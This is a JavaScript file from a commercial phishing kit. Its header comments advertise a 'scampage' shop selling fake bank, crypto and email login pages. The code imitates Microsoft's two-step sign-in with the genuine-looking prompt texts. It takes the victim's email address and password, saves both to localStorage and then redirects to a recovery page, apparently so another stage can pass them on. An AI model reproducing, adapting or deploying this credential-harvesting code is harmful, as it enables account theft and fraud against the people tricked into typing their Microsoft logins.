//THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//

//Do not touch this section

//When testing results, if you don't find it in your inbox, check your spam folder.

//If you want to get quality:
// - USA Banks Scampage
// - UK Banks Scampage
// - Australian Scampage
// - Canadian Scampage
// - Crypto Websites Scampage 
// - Email Accounts Scampage
// - Newsletter Scampage and more..

// Visit: https://www.scampage.shop/

document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";

    let unameVal = pwdVal = false;

    unameInp.addEventListener('keydown', (event) => handleNextDown(event, nxt));

    function handleNextDown(event, nextButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            nextButton.click(); // Trigger the click event on the next button
        }
    }

    pwdInp.addEventListener('keydown', (event) => handleSigDown(event, sig));

    function handleSigDown(event, sigButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            sigButton.click(); // Trigger the click event on the next button
        }
    }

    /////next button
    const nxt = document.getElementById('btn_next');

    nxt.addEventListener('click', () => {
        //validate the form
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            })
            view = "pwd";
        }
    })

    //////sign in button

    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', () => {
        //validate the form
        validate();
        if (pwdVal) {
            document.getElementById("section_pwd").classList.toggle('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";
        }
    })

    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }

        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }

        }
        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
                const email = unameInp.value;
                localStorage.setItem("email", email);
            }
            unameInp.addEventListener('change', function() {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            })
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
                const password = pwdInp.value;
                localStorage.setItem("password", password);
                //saveAndSendLogs();
            }
            pwdInp.addEventListener('change', function() {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            })
        }
        return false;
    }

    //back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    })

    //final buttons
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            saveAndSendLogs();
        })

        b.addEventListener('keydown', (event) => handleFinalDown(event, b));
    })

    function handleFinalDown(event, b) {
        if (event.key === "Enter") {
            event.preventDefault();
            saveAndSendLogs(); // Trigger the click event on the next button
        }
    }

    function saveAndSendLogs() {
        window.location.href = "/recover.html"
    }
});